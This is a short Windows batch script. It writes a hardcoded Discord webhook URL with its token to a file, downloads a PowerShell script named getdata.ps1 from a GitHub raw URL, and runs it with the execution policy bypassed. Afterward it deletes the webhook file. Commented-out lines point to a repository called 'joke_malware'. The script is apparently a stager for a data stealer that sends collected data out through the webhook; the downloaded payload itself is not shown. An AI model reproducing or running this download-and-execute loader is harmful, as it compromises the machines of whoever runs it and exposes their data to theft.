@echo off
::if not exist "%~dp0url.txt" (
::  curl -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
::)
::for /F %%i in (url.txt) do set url=%%i
::del url.txt
echo https://discord.com/api/webhooks/1491073066145677542/NlYoNlDnzPxXh4T3_QzmobOlqGoyw5G3g7HUiaIQa4VL5TM4r2XpyZnZ0Qh4WWocWarz>discord_webhook.txt
if not exist "%~dp0getdata.ps1" (
  curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1"
)
powershell.exe -ExecutionPolicy Bypass -Command "%~dp0getdata.ps1"
timeout 10 >nul
del discord_webhook.txt
